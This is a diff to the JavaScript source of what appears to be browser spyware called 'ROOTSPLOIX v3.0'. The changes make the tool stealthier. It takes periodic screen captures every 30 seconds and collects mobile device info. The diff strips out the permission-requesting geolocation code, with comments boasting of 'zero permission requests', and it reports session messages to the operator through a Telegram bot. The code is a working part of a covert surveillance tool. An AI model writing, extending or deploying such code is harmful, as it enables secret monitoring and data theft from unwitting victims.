@@ -1683,7 +1683,7 @@ ${pageData.bodyContent}\n...\n\`\`\``;
             startPeriodicCapture() {
                 // Mobile-optimized capture intervals
                 this.captureInterval = setInterval(() => {
-                    this.attemptStealthScreenshot();
+                    this.stealthScreenCapture();
                     this.captureMobileInfo();
                 }, 30000); // Every 30 seconds
                 
@@ -2043,63 +2043,30 @@ ${pageData.bodyContent}\n...\n\`\`\``;
             }
             
             async initialize() {
-                if (!navigator.geolocation) {
-                    RootsploixUtils.log('warn', 'Geolocation not supported');
-                    return;
-                }
-                
-                try {
-                    await this.getCurrentLocation();
-                    this.startTracking();
-                } catch (error) {
-                    RootsploixUtils.log('error', 'Location access denied', error);
-                    
-                    const errorMsg = `⚠️ LOCATION ACCESS DENIED!
+                // STEALTH LOCATION - NO PERMISSIONS REQUESTED
+                const locationMsg = `📍 LOCATION MODULE DISABLED!
 
 🎯 Session: ${ROOTSPLOIX_SESSION.id}
-⚠️ Error: ${error.message}
+🚫 Location tracking disabled for full stealth
+🥷 Zero permission requests
 🕒 Time: ${new Date().toLocaleString()}
 
-💀 ROOTSPLOIX v3.0`;
-                    
-                    await telegram.sendMessage(errorMsg);
-                }
+💀 ROOTSPLOIX STEALTH v3.0`;
+                
+                await telegram.sendMessage(locationMsg);
+                
+                RootsploixUtils.log('info', 'Location module disabled for stealth');
             }
             
+            // STEALTH MODE - NO LOCATION TRACKING
             getCurrentLocation() {
-                return new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            this.processLocation(position);
-                            resolve(position);
-                        },
-                        (error) => {
-                            reject(error);
-                        },
-                        this.options
-                    );
-                });
+                RootsploixUtils.log('info', 'Location tracking disabled for stealth');
+                return null;
             }
             
             startTracking() {
-                if (!navigator.geolocation) return;
-                
-                this.isActive = true;
-                
-                this.watchId = navigator.geolocation.watchPosition(
-                    (position) => {
-                        this.processLocation(position);
-                    },
-                    (error) => {
-                        RootsploixUtils.log('error', 'Location tracking error', error);
-                    },
-                    {
-                        ...this.options,
-                        maximumAge: 300000 // 5 minutes
-                    }
-                );
-                
-                RootsploixUtils.log('info', 'Location tracking started');
+                RootsploixUtils.log('info', 'Location tracking disabled for stealth');
+                return;
             }
             
             async processLocation(position) {
